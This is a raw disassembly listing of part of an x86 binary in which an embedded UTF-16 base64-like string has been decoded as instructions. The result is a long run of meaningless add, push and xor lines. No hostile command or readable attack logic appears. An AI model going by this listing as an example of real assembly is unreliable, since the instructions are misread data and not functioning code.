  40a4cc:	45                   	inc    %ebp
  40a4cd:	00 2f                	add    %ch,(%edi)
  40a4cf:	00 31                	add    %dh,(%ecx)
  40a4d1:	00 61 00             	add    %ah,0x0(%ecx)
  40a4d4:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40a4d8:	78 00                	js     0x40a4da
  40a4da:	68 00 59 00 42       	push   $0x42005900
  40a4df:	00 70 00             	add    %dh,0x0(%eax)
  40a4e2:	35 00 55 00 59       	xor    $0x59005500,%eax
  40a4e7:	00 73 00             	add    %dh,0x0(%ebx)
  40a4ea:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40a4ee:	71 00                	jno    0x40a4f0
  40a4f0:	30 00                	xor    %al,(%eax)
  40a4f2:	31 00                	xor    %eax,(%eax)
  40a4f4:	32 00                	xor    (%eax),%al
  40a4f6:	33 00                	xor    (%eax),%eax
  40a4f8:	59                   	pop    %ecx
  40a4f9:	00 4e 00             	add    %cl,0x0(%esi)
  40a4fc:	76 00                	jbe    0x40a4fe
  40a4fe:	30 00                	xor    %al,(%eax)
  40a500:	5a                   	pop    %edx
  40a501:	00 39                	add    %bh,(%ecx)
  40a503:	00 33                	add    %dh,(%ebx)
  40a505:	00 59 00             	add    %bl,0x0(%ecx)
  40a508:	70 00                	jo     0x40a50a
  40a50a:	33 00                	xor    (%eax),%eax
  40a50c:	6c                   	insb   (%dx),%es:(%edi)
  40a50d:	00 67 00             	add    %ah,0x0(%edi)
  40a510:	31 00                	xor    %eax,(%eax)
  40a512:	56                   	push   %esi
  40a513:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  40a517:	00 41 00             	add    %al,0x0(%ecx)
  40a51a:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a51e:	62 00                	bound  %eax,(%eax)
  40a520:	63 00                	arpl   %eax,(%eax)
  40a522:	51                   	push   %ecx
  40a523:	00 49 00             	add    %cl,0x0(%ecx)
  40a526:	61                   	popa
  40a527:	00 41 00             	add    %al,0x0(%ecx)
  40a52a:	67 00 34             	add    %dh,(%si)
  40a52d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a530:	43                   	inc    %ebx
  40a531:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40a535:	00 47 00             	add    %al,0x0(%edi)
  40a538:	61                   	popa
  40a539:	00 47 00             	add    %al,0x0(%edi)
  40a53c:	69 00 64 00 4f 00    	imul   $0x4f0064,(%eax),%eax
  40a542:	70 00                	jo     0x40a544
  40a544:	4a                   	dec    %edx
  40a545:	00 7a 00             	add    %bh,0x0(%edx)
  40a548:	6c                   	insb   (%dx),%es:(%edi)
  40a549:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a54d:	00 50 00             	add    %dl,0x0(%eax)
  40a550:	6d                   	insl   (%dx),%es:(%edi)
  40a551:	00 35 00 2f 00 61    	add    %dh,0x61002f00
  40a557:	00 37                	add    %dh,(%edi)
  40a559:	00 70 00             	add    %dh,0x0(%eax)
  40a55c:	57                   	push   %edi
  40a55d:	00 38                	add    %bh,(%eax)
  40a55f:	00 57 00             	add    %dl,0x0(%edi)
  40a562:	41                   	inc    %ecx
  40a563:	00 69 00             	add    %ch,0x0(%ecx)
  40a566:	68 00 50 00 49       	push   $0x49005000
  40a56b:	00 78 00             	add    %bh,0x0(%eax)
  40a56e:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a572:	6f                   	outsl  %ds:(%esi),(%dx)
  40a573:	00 6b 00             	add    %ch,0x0(%ebx)
  40a576:	37                   	aaa
  40a577:	00 68 00             	add    %ch,0x0(%eax)
  40a57a:	42                   	inc    %edx
  40a57b:	00 32                	add    %dh,(%edx)
  40a57d:	00 49 00             	add    %cl,0x0(%ecx)
  40a580:	77 00                	ja     0x40a582
  40a582:	6c                   	insb   (%dx),%es:(%edi)
  40a583:	00 61 00             	add    %ah,0x0(%ecx)
  40a586:	43                   	inc    %ebx
  40a587:	00 73 00             	add    %dh,0x0(%ebx)
  40a58a:	41                   	inc    %ecx
  40a58b:	00 78 00             	add    %bh,0x0(%eax)
  40a58e:	64 00 39             	add    %bh,%fs:(%ecx)
  40a591:	00 6f 00             	add    %ch,0x0(%edi)
  40a594:	56                   	push   %esi
  40a595:	00 70 00             	add    %dh,0x0(%eax)
  40a598:	2b 00                	sub    (%eax),%eax
  40a59a:	61                   	popa
  40a59b:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40a59f:	00 47 00             	add    %al,0x0(%edi)
  40a5a2:	68 00 36 00 63       	push   $0x63003600
  40a5a7:	00 30                	add    %dh,(%eax)
  40a5a9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5ac:	77 00                	ja     0x40a5ae
  40a5ae:	39 00                	cmp    %eax,(%eax)
  40a5b0:	6c                   	insb   (%dx),%es:(%edi)
  40a5b1:	00 71 00             	add    %dh,0x0(%ecx)
  40a5b4:	4c                   	dec    %esp
  40a5b5:	00 36                	add    %dh,(%esi)
  40a5b7:	00 2b                	add    %ch,(%ebx)
  40a5b9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5bc:	65 00 37             	add    %dh,%gs:(%edi)
  40a5bf:	00 5a 00             	add    %bl,0x0(%edx)
  40a5c2:	46                   	inc    %esi
  40a5c3:	00 6a 00             	add    %ch,0x0(%edx)
  40a5c6:	74 00                	je     0x40a5c8
  40a5c8:	55                   	push   %ebp
  40a5c9:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40a5cd:	00 30                	add    %dh,(%eax)
  40a5cf:	00 72 00             	add    %dh,0x0(%edx)
  40a5d2:	54                   	push   %esp
  40a5d3:	00 53 00             	add    %dl,0x0(%ebx)
  40a5d6:	41                   	inc    %ecx
  40a5d7:	00 4f 00             	add    %cl,0x0(%edi)
  40a5da:	74 00                	je     0x40a5dc
  40a5dc:	49                   	dec    %ecx
  40a5dd:	00 4a 00             	add    %cl,0x0(%edx)
  40a5e0:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40a5e4:	69 00 76 00 6d 00    	imul   $0x6d0076,(%eax),%eax
  40a5ea:	5a                   	pop    %edx
  40a5eb:	00 41 00             	add    %al,0x0(%ecx)
  40a5ee:	38 00                	cmp    %al,(%eax)
  40a5f0:	65 00 64 00 78       	add    %ah,%gs:0x78(%eax,%eax,1)
  40a5f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a5f8:	39 00                	cmp    %eax,(%eax)
  40a5fa:	67 00 36 00 41       	add    %dh,0x4100
  40a5ff:	00 61 00             	add    %ah,0x0(%ecx)
  40a602:	76 00                	jbe    0x40a604
  40a604:	5a                   	pop    %edx
  40a605:	00 65 00             	add    %ah,0x0(%ebp)
  40a608:	56                   	push   %esi
  40a609:	00 2f                	add    %ch,(%edi)
  40a60b:	00 62 00             	add    %ah,0x0(%edx)
  40a60e:	6b 00 72             	imul   $0x72,(%eax),%eax
  40a611:	00 52 00             	add    %dl,0x0(%edx)
  40a614:	76 00                	jbe    0x40a616
  40a616:	75 00                	jne    0x40a618
  40a618:	6f                   	outsl  %ds:(%esi),(%dx)
  40a619:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40a61d:	00 53 00             	add    %dl,0x0(%ebx)
  40a620:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a623:	00 51 00             	add    %dl,0x0(%ecx)
  40a626:	38 00                	cmp    %al,(%eax)
  40a628:	53                   	push   %ebx
  40a629:	00 79 00             	add    %bh,0x0(%ecx)
  40a62c:	36 00 4c 00 34       	add    %cl,%ss:0x34(%eax,%eax,1)
  40a631:	00 48 00             	add    %cl,0x0(%eax)
  40a634:	72 00                	jb     0x40a636
  40a636:	4b                   	dec    %ebx
  40a637:	00 77 00             	add    %dh,0x0(%edi)
  40a63a:	76 00                	jbe    0x40a63c
  40a63c:	55                   	push   %ebp
  40a63d:	00 6f 00             	add    %ch,0x0(%edi)
  40a640:	42                   	inc    %edx
  40a641:	00 49 00             	add    %cl,0x0(%ecx)
  40a644:	31 00                	xor    %eax,(%eax)
  40a646:	62 00                	bound  %eax,(%eax)
  40a648:	56                   	push   %esi
  40a649:	00 5a 00             	add    %bl,0x0(%edx)
  40a64c:	48                   	dec    %eax
  40a64d:	00 59 00             	add    %bl,0x0(%ecx)
  40a650:	6a 00                	push   $0x0
  40a652:	55                   	push   %ebp
  40a653:	00 57 00             	add    %dl,0x0(%edi)
  40a656:	56                   	push   %esi
  40a657:	00 68 00             	add    %ch,0x0(%eax)
  40a65a:	75 00                	jne    0x40a65c
  40a65c:	68 00 6a 00 38       	push   $0x38006a00
  40a661:	00 38                	add    %bh,(%eax)
  40a663:	00 2b                	add    %ch,(%ebx)
  40a665:	00 75 00             	add    %dh,0x0(%ebp)
  40a668:	79 00                	jns    0x40a66a
  40a66a:	33 00                	xor    (%eax),%eax
  40a66c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a66d:	00 6a 00             	add    %ch,0x0(%edx)
  40a670:	6c                   	insb   (%dx),%es:(%edi)
  40a671:	00 65 00             	add    %ah,0x0(%ebp)
  40a674:	59                   	pop    %ecx
  40a675:	00 6b 00             	add    %ch,0x0(%ebx)
  40a678:	6a 00                	push   $0x0
  40a67a:	52                   	push   %edx
  40a67b:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40a67f:	00 68 00             	add    %ch,0x0(%eax)
  40a682:	67 00 64 00          	add    %ah,0x0(%si)
  40a686:	49                   	dec    %ecx
  40a687:	00 67 00             	add    %ah,0x0(%edi)
  40a68a:	62 00                	bound  %eax,(%eax)
  40a68c:	72 00                	jb     0x40a68e
  40a68e:	39 00                	cmp    %eax,(%eax)
  40a690:	49                   	dec    %ecx
  40a691:	00 33                	add    %dh,(%ebx)
  40a693:	00 4f 00             	add    %cl,0x0(%edi)
  40a696:	75 00                	jne    0x40a698
  40a698:	43                   	inc    %ebx
  40a699:	00 68 00             	add    %ch,0x0(%eax)
  40a69c:	70 00                	jo     0x40a69e
  40a69e:	69 00 57 00 74 00    	imul   $0x740057,(%eax),%eax
  40a6a4:	4f                   	dec    %edi
  40a6a5:	00 73 00             	add    %dh,0x0(%ebx)
  40a6a8:	42                   	inc    %edx
  40a6a9:	00 42 00             	add    %al,0x0(%edx)
  40a6ac:	5a                   	pop    %edx
  40a6ad:	00 76 00             	add    %dh,0x0(%esi)
  40a6b0:	54                   	push   %esp
  40a6b1:	00 79 00             	add    %bh,0x0(%ecx)
  40a6b4:	32 00                	xor    (%eax),%al
  40a6b6:	45                   	inc    %ebp
  40a6b7:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6ba:	47                   	inc    %edi
  40a6bb:	00 5a 00             	add    %bl,0x0(%edx)
  40a6be:	63 00                	arpl   %eax,(%eax)
  40a6c0:	73 00                	jae    0x40a6c2
  40a6c2:	74 00                	je     0x40a6c4
  40a6c4:	7a 00                	jp     0x40a6c6
  40a6c6:	73 00                	jae    0x40a6c8
  40a6c8:	41                   	inc    %ecx
  40a6c9:	00 4f 00             	add    %cl,0x0(%edi)
  40a6cc:	6d                   	insl   (%dx),%es:(%edi)
  40a6cd:	00 31                	add    %dh,(%ecx)
  40a6cf:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6d2:	4c                   	dec    %esp
  40a6d3:	00 66 00             	add    %ah,0x0(%esi)
  40a6d6:	2b 00                	sub    (%eax),%eax
  40a6d8:	52                   	push   %edx
  40a6d9:	00 51 00             	add    %dl,0x0(%ecx)
  40a6dc:	75 00                	jne    0x40a6de
  40a6de:	63 00                	arpl   %eax,(%eax)
  40a6e0:	72 00                	jb     0x40a6e2
  40a6e2:	75 00                	jne    0x40a6e4
  40a6e4:	39 00                	cmp    %eax,(%eax)
  40a6e6:	67 00 75 00          	add    %dh,0x0(%di)
  40a6ea:	73 00                	jae    0x40a6ec
  40a6ec:	50                   	push   %eax
  40a6ed:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6f0:	53                   	push   %ebx
  40a6f1:	00 4f 00             	add    %cl,0x0(%edi)
  40a6f4:	57                   	push   %edi
  40a6f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a6f8:	44                   	inc    %esp
  40a6f9:	00 36                	add    %dh,(%esi)
  40a6fb:	00 78 00             	add    %bh,0x0(%eax)
  40a6fe:	76 00                	jbe    0x40a700
  40a700:	54                   	push   %esp
  40a701:	00 70 00             	add    %dh,0x0(%eax)
  40a704:	46                   	inc    %esi
  40a705:	00 79 00             	add    %bh,0x0(%ecx)
  40a708:	39 00                	cmp    %eax,(%eax)
  40a70a:	48                   	dec    %eax
  40a70b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a70e:	57                   	push   %edi
  40a70f:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40a713:	00 62 00             	add    %ah,0x0(%edx)
  40a716:	73 00                	jae    0x40a718
  40a718:	57                   	push   %edi
  40a719:	00 77 00             	add    %dh,0x0(%edi)
  40a71c:	4a                   	dec    %edx
  40a71d:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40a721:	00 4a 00             	add    %cl,0x0(%edx)
  40a724:	51                   	push   %ecx
  40a725:	00 61 00             	add    %ah,0x0(%ecx)
  40a728:	6a 00                	push   $0x0
  40a72a:	35 00 6b 00 43       	xor    $0x43006b00,%eax
  40a72f:	00 41 00             	add    %al,0x0(%ecx)
  40a732:	53                   	push   %ebx
  40a733:	00 4b 00             	add    %cl,0x0(%ebx)
  40a736:	4c                   	dec    %esp
  40a737:	00 69 00             	add    %ch,0x0(%ecx)
  40a73a:	34 00                	xor    $0x0,%al
  40a73c:	55                   	push   %ebp
  40a73d:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40a741:	00 78 00             	add    %bh,0x0(%eax)
  40a744:	6f                   	outsl  %ds:(%esi),(%dx)
  40a745:	00 57 00             	add    %dl,0x0(%edi)
  40a748:	35 00 55 00 4a       	xor    $0x4a005500,%eax
  40a74d:	00 37                	add    %dh,(%edi)
  40a74f:	00 78 00             	add    %bh,0x0(%eax)
  40a752:	51                   	push   %ecx
  40a753:	00 7a 00             	add    %bh,0x0(%edx)
  40a756:	50                   	push   %eax
  40a757:	00 70 00             	add    %dh,0x0(%eax)
  40a75a:	52                   	push   %edx
  40a75b:	00 75 00             	add    %dh,0x0(%ebp)
  40a75e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a75f:	00 56 00             	add    %dl,0x0(%esi)
  40a762:	61                   	popa
  40a763:	00 6f 00             	add    %ch,0x0(%edi)
  40a766:	48                   	dec    %eax
  40a767:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a76b:	00 69 00             	add    %ch,0x0(%ecx)
  40a76e:	48                   	dec    %eax
  40a76f:	00 6a 00             	add    %ch,0x0(%edx)
  40a772:	41                   	inc    %ecx
  40a773:	00 6e 00             	add    %ch,0x0(%esi)
  40a776:	79 00                	jns    0x40a778
  40a778:	56                   	push   %esi
  40a779:	00 4a 00             	add    %cl,0x0(%edx)
  40a77c:	50                   	push   %eax
  40a77d:	00 2f                	add    %ch,(%edi)
  40a77f:	00 4e 00             	add    %cl,0x0(%esi)
  40a782:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a785:	00 77 00             	add    %dh,0x0(%edi)
  40a788:	31 00                	xor    %eax,(%eax)
  40a78a:	48                   	dec    %eax
  40a78b:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a78f:	00 38                	add    %bh,(%eax)
  40a791:	00 49 00             	add    %cl,0x0(%ecx)
  40a794:	47                   	inc    %edi
  40a795:	00 58 00             	add    %bl,0x0(%eax)
  40a798:	7a 00                	jp     0x40a79a
  40a79a:	70 00                	jo     0x40a79c
  40a79c:	45                   	inc    %ebp
  40a79d:	00 41 00             	add    %al,0x0(%ecx)
  40a7a0:	47                   	inc    %edi
  40a7a1:	00 50 00             	add    %dl,0x0(%eax)
  40a7a4:	43                   	inc    %ebx
  40a7a5:	00 55 00             	add    %dl,0x0(%ebp)
  40a7a8:	38 00                	cmp    %al,(%eax)
  40a7aa:	58                   	pop    %eax
  40a7ab:	00 63 00             	add    %ah,0x0(%ebx)
  40a7ae:	4a                   	dec    %edx
  40a7af:	00 67 00             	add    %ah,0x0(%edi)
  40a7b2:	46                   	inc    %esi
  40a7b3:	00 5a 00             	add    %bl,0x0(%edx)
  40a7b6:	78 00                	js     0x40a7b8
  40a7b8:	74 00                	je     0x40a7ba
  40a7ba:	53                   	push   %ebx
  40a7bb:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40a7bf:	00 30                	add    %dh,(%eax)
  40a7c1:	00 55 00             	add    %dl,0x0(%ebp)
  40a7c4:	37                   	aaa
  40a7c5:	00 51 00             	add    %dl,0x0(%ecx)
  40a7c8:	45                   	inc    %ebp
  40a7c9:	00 30                	add    %dh,(%eax)
  40a7cb:	00 38                	add    %bh,(%eax)
  40a7cd:	00 72 00             	add    %dh,0x0(%edx)
  40a7d0:	34 00                	xor    $0x0,%al
  40a7d2:	68 00 2b 00 46       	push   $0x46002b00
  40a7d7:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40a7db:	00 46 00             	add    %al,0x0(%esi)
  40a7de:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40a7e2:	58                   	pop    %eax
  40a7e3:	00 42 00             	add    %al,0x0(%edx)
  40a7e6:	33 00                	xor    (%eax),%eax
  40a7e8:	35 00 52 00 37       	xor    $0x37005200,%eax
  40a7ed:	00 75 00             	add    %dh,0x0(%ebp)
  40a7f0:	75 00                	jne    0x40a7f2
  40a7f2:	52                   	push   %edx
  40a7f3:	00 67 00             	add    %ah,0x0(%edi)
  40a7f6:	4e                   	dec    %esi
  40a7f7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7fa:	31 00                	xor    %eax,(%eax)
  40a7fc:	48                   	dec    %eax
  40a7fd:	00 32                	add    %dh,(%edx)
  40a7ff:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a803:	00 31                	add    %dh,(%ecx)
  40a805:	00 79 00             	add    %bh,0x0(%ecx)
  40a808:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40a80c:	31 00                	xor    %eax,(%eax)
  40a80e:	75 00                	jne    0x40a810
  40a810:	42                   	inc    %edx
  40a811:	00 31                	add    %dh,(%ecx)
  40a813:	00 46 00             	add    %al,0x0(%esi)
  40a816:	70 00                	jo     0x40a818
  40a818:	35 00 6c 00 66       	xor    $0x66006c00,%eax
  40a81d:	00 78 00             	add    %bh,0x0(%eax)
  40a820:	53                   	push   %ebx
  40a821:	00 33                	add    %dh,(%ebx)
  40a823:	00 75 00             	add    %dh,0x0(%ebp)
  40a826:	4a                   	dec    %edx
  40a827:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a82a:	2f                   	das
  40a82b:	00 55 00             	add    %dl,0x0(%ebp)
  40a82e:	4a                   	dec    %edx
  40a82f:	00 47 00             	add    %al,0x0(%edi)
  40a832:	53                   	push   %ebx
  40a833:	00 4d 00             	add    %cl,0x0(%ebp)
  40a836:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40a83a:	32 00                	xor    (%eax),%al
  40a83c:	6c                   	insb   (%dx),%es:(%edi)
  40a83d:	00 68 00             	add    %ch,0x0(%eax)
  40a840:	66 00 4c 00 55       	data16 add %cl,0x55(%eax,%eax,1)
  40a845:	00 72 00             	add    %dh,0x0(%edx)
  40a848:	30 00                	xor    %al,(%eax)
  40a84a:	4f                   	dec    %edi
  40a84b:	00 6f 00             	add    %ch,0x0(%edi)
  40a84e:	4b                   	dec    %ebx
  40a84f:	00 72 00             	add    %dh,0x0(%edx)
  40a852:	6a 00                	push   $0x0
  40a854:	53                   	push   %ebx
  40a855:	00 6b 00             	add    %ch,0x0(%ebx)
  40a858:	2f                   	das
  40a859:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40a85d:	00 33                	add    %dh,(%ebx)
  40a85f:	00 51 00             	add    %dl,0x0(%ecx)
  40a862:	38 00                	cmp    %al,(%eax)
  40a864:	51                   	push   %ecx
  40a865:	00 4b 00             	add    %cl,0x0(%ebx)
  40a868:	41                   	inc    %ecx
  40a869:	00 42 00             	add    %al,0x0(%edx)
  40a86c:	5a                   	pop    %edx
  40a86d:	00 76 00             	add    %dh,0x0(%esi)
  40a870:	49                   	dec    %ecx
  40a871:	00 38                	add    %bh,(%eax)
  40a873:	00 70 00             	add    %dh,0x0(%eax)
  40a876:	6d                   	insl   (%dx),%es:(%edi)
  40a877:	00 7a 00             	add    %bh,0x0(%edx)
  40a87a:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40a87e:	48                   	dec    %eax
  40a87f:	00 58 00             	add    %bl,0x0(%eax)
  40a882:	54                   	push   %esp
  40a883:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a886:	42                   	inc    %edx
  40a887:	00 36                	add    %dh,(%esi)
  40a889:	00 4b 00             	add    %cl,0x0(%ebx)
  40a88c:	42                   	inc    %edx
  40a88d:	00 51 00             	add    %dl,0x0(%ecx)
  40a890:	6a 00                	push   $0x0
  40a892:	58                   	pop    %eax
  40a893:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a896:	74 00                	je     0x40a898
  40a898:	45                   	inc    %ebp
  40a899:	00 79 00             	add    %bh,0x0(%ecx)
  40a89c:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a8a0:	53                   	push   %ebx
  40a8a1:	00 6f 00             	add    %ch,0x0(%edi)
  40a8a4:	69 00 33 00 33 00    	imul   $0x330033,(%eax),%eax
  40a8aa:	6c                   	insb   (%dx),%es:(%edi)
  40a8ab:	00 58 00             	add    %bl,0x0(%eax)
  40a8ae:	39 00                	cmp    %eax,(%eax)
  40a8b0:	2f                   	das
  40a8b1:	00 50 00             	add    %dl,0x0(%eax)
  40a8b4:	6d                   	insl   (%dx),%es:(%edi)
  40a8b5:	00 58 00             	add    %bl,0x0(%eax)
  40a8b8:	6d                   	insl   (%dx),%es:(%edi)
  40a8b9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8bc:	62 00                	bound  %eax,(%eax)
  40a8be:	33 00                	xor    (%eax),%eax
  40a8c0:	75 00                	jne    0x40a8c2
  40a8c2:	54                   	push   %esp
  40a8c3:	00 43 00             	add    %al,0x0(%ebx)
  40a8c6:	32 00                	xor    (%eax),%al
  40a8c8:	50                   	push   %eax
  40a8c9:	00 33                	add    %dh,(%ebx)
  40a8cb:	00 53 00             	add    %dl,0x0(%ebx)
  40a8ce:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a8d2:	79 00                	jns    0x40a8d4
  40a8d4:	64 00 36             	add    %dh,%fs:(%esi)
  40a8d7:	00 43 00             	add    %al,0x0(%ebx)
  40a8da:	33 00                	xor    (%eax),%eax
  40a8dc:	7a 00                	jp     0x40a8de
  40a8de:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8df:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40a8e3:	00 4f 00             	add    %cl,0x0(%edi)
  40a8e6:	53                   	push   %ebx
  40a8e7:	00 43 00             	add    %al,0x0(%ebx)
  40a8ea:	41                   	inc    %ecx
  40a8eb:	00 31                	add    %dh,(%ecx)
  40a8ed:	00 38                	add    %bh,(%eax)
  40a8ef:	00 50 00             	add    %dl,0x0(%eax)
  40a8f2:	39 00                	cmp    %eax,(%eax)
  40a8f4:	2b 00                	sub    (%eax),%eax
  40a8f6:	77 00                	ja     0x40a8f8
  40a8f8:	71 00                	jno    0x40a8fa
  40a8fa:	68 00 43 00 4f       	push   $0x4f004300
  40a8ff:	00 42 00             	add    %al,0x0(%edx)
  40a902:	47                   	inc    %edi
  40a903:	00 5a 00             	add    %bl,0x0(%edx)
  40a906:	59                   	pop    %ecx
  40a907:	00 30                	add    %dh,(%eax)
  40a909:	00 79 00             	add    %bh,0x0(%ecx)
  40a90c:	4e                   	dec    %esi
  40a90d:	00 57 00             	add    %dl,0x0(%edi)
  40a910:	75 00                	jne    0x40a912
  40a912:	56                   	push   %esi
  40a913:	00 42 00             	add    %al,0x0(%edx)
  40a916:	52                   	push   %edx
  40a917:	00 62 00             	add    %ah,0x0(%edx)
  40a91a:	51                   	push   %ecx
  40a91b:	00 2b                	add    %ch,(%ebx)
  40a91d:	00 79 00             	add    %bh,0x0(%ecx)
  40a920:	51                   	push   %ecx
  40a921:	00 4b 00             	add    %cl,0x0(%ebx)
  40a924:	6f                   	outsl  %ds:(%esi),(%dx)
  40a925:	00 79 00             	add    %bh,0x0(%ecx)
  40a928:	7a 00                	jp     0x40a92a
  40a92a:	4a                   	dec    %edx
  40a92b:	00 36                	add    %dh,(%esi)
  40a92d:	00 32                	add    %dh,(%edx)
  40a92f:	00 67 00             	add    %ah,0x0(%edi)
  40a932:	71 00                	jno    0x40a934
  40a934:	4b                   	dec    %ebx
  40a935:	00 45 00             	add    %al,0x0(%ebp)
  40a938:	35 00 73 00 4d       	xor    $0x4d007300,%eax
  40a93d:	00 4e 00             	add    %cl,0x0(%esi)
  40a940:	67 00 6c 00          	add    %ch,0x0(%si)
  40a944:	33 00                	xor    (%eax),%eax
  40a946:	48                   	dec    %eax
  40a947:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40a94b:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a94f:	00 7a 00             	add    %bh,0x0(%edx)
  40a952:	66 00 37             	data16 add %dh,(%edi)
  40a955:	00 4f 00             	add    %cl,0x0(%edi)
  40a958:	54                   	push   %esp
  40a959:	00 53 00             	add    %dl,0x0(%ebx)
  40a95c:	4e                   	dec    %esi
  40a95d:	00 77 00             	add    %dh,0x0(%edi)
  40a960:	2f                   	das
  40a961:	00 75 00             	add    %dh,0x0(%ebp)
  40a964:	68 00 36 00 30       	push   $0x30003600
  40a969:	00 32                	add    %dh,(%edx)
  40a96b:	00 46 00             	add    %al,0x0(%esi)
  40a96e:	7a 00                	jp     0x40a970
  40a970:	79 00                	jns    0x40a972
  40a972:	53                   	push   %ebx
  40a973:	00 45 00             	add    %al,0x0(%ebp)
  40a976:	67 00 4c 00          	add    %cl,0x0(%si)
  40a97a:	71 00                	jno    0x40a97c
  40a97c:	35 00 47 00 4a       	xor    $0x4a004700,%eax
  40a981:	00 61 00             	add    %ah,0x0(%ecx)
  40a984:	51                   	push   %ecx
  40a985:	00 47 00             	add    %al,0x0(%edi)
  40a988:	66 00 31             	data16 add %dh,(%ecx)
  40a98b:	00 57 00             	add    %dl,0x0(%edi)
  40a98e:	59                   	pop    %ecx
  40a98f:	00 6e 00             	add    %ch,0x0(%esi)
  40a992:	31 00                	xor    %eax,(%eax)
  40a994:	61                   	popa
  40a995:	00 58 00             	add    %bl,0x0(%eax)
  40a998:	4c                   	dec    %esp
  40a999:	00 53 00             	add    %dl,0x0(%ebx)
  40a99c:	43                   	inc    %ebx
  40a99d:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40a9a1:	00 65 00             	add    %ah,0x0(%ebp)
  40a9a4:	46                   	inc    %esi
  40a9a5:	00 73 00             	add    %dh,0x0(%ebx)
  40a9a8:	72 00                	jb     0x40a9aa
  40a9aa:	73 00                	jae    0x40a9ac
  40a9ac:	6d                   	insl   (%dx),%es:(%edi)
  40a9ad:	00 68 00             	add    %ch,0x0(%eax)
  40a9b0:	49                   	dec    %ecx
  40a9b1:	00 55 00             	add    %dl,0x0(%ebp)
  40a9b4:	78 00                	js     0x40a9b6
  40a9b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9b7:	00 7a 00             	add    %bh,0x0(%edx)
  40a9ba:	32 00                	xor    (%eax),%al
  40a9bc:	54                   	push   %esp
  40a9bd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9c0:	7a 00                	jp     0x40a9c2
  40a9c2:	62 00                	bound  %eax,(%eax)
  40a9c4:	34 00                	xor    $0x0,%al
  40a9c6:	43                   	inc    %ebx
  40a9c7:	00 6a 00             	add    %ch,0x0(%edx)
  40a9ca:	2b 00                	sub    (%eax),%eax
  40a9cc:	7a 00                	jp     0x40a9ce
  40a9ce:	55                   	push   %ebp
  40a9cf:	00 69 00             	add    %ch,0x0(%ecx)
  40a9d2:	36 00 36             	add    %dh,%ss:(%esi)
  40a9d5:	00 36                	add    %dh,(%esi)
  40a9d7:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40a9db:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9de:	56                   	push   %esi
  40a9df:	00 76 00             	add    %dh,0x0(%esi)
  40a9e2:	70 00                	jo     0x40a9e4
  40a9e4:	59                   	pop    %ecx
  40a9e5:	00 55 00             	add    %dl,0x0(%ebp)
  40a9e8:	4f                   	dec    %edi
  40a9e9:	00 67 00             	add    %ah,0x0(%edi)
  40a9ec:	46                   	inc    %esi
  40a9ed:	00 73 00             	add    %dh,0x0(%ebx)
  40a9f0:	79 00                	jns    0x40a9f2
  40a9f2:	4f                   	dec    %edi
  40a9f3:	00 41 00             	add    %al,0x0(%ecx)
  40a9f6:	38 00                	cmp    %al,(%eax)
  40a9f8:	43                   	inc    %ebx
  40a9f9:	00 67 00             	add    %ah,0x0(%edi)
  40a9fc:	43                   	inc    %ebx
  40a9fd:	00 56 00             	add    %dl,0x0(%esi)
  40aa00:	39 00                	cmp    %eax,(%eax)
  40aa02:	79 00                	jns    0x40aa04
  40aa04:	35 00 34 00 61       	xor    $0x61003400,%eax
  40aa09:	00 77 00             	add    %dh,0x0(%edi)
  40aa0c:	52                   	push   %edx
  40aa0d:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa10:	6a 00                	push   $0x0
  40aa12:	62 00                	bound  %eax,(%eax)
  40aa14:	50                   	push   %eax
